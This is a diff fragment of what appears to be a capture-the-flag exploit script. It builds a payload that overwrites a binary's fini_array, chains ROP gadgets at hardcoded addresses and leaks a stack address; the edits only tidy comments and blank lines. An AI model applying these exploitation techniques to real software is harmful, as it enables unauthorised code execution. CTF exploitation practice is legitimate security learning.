@@ -49,11 +49,10 @@ def exploit(host):
     fini_arr = 0xB13178
     main_addr = 0x4ED227 # main
     strcat_got = 0xB16078
-
     gadget = 0x00000000008b2779
 
+    # 1st round
     r.send('%d'%0xa2+'\0'*0x12)
-
     payload = ''
     payload += 'nwUqlMPQ'
     val = len('Your Happiness equals :nwUqlMPQ')
@@ -63,7 +62,6 @@ def exploit(host):
     payload = payload.ljust(0x101, 'a')
     payload += p64(fini_arr)
     payload += 'a'*7
-    #payload += p64(0xdeadbeefdeadbeef)
     payload += gen_rop()
     r.send(payload.ljust(999, 'a'))
     sleep(2)
@@ -78,8 +76,7 @@ def exploit(host):
     stack = int(data, 16)-0x4e0+0x40+0x30-0x78
     log.info('stack 0x%016x' % stack)
 
-    #gdb.attach(r, 'b *(%d)'%(0x4F40C3))
-    #gdb.attach(r, 'b *(%d)'%(0x4ED21D))
+    # 2nd round
     sleep(2)
     r.send('%d'%0xa2+'\0'*0x12)
     payload = ''
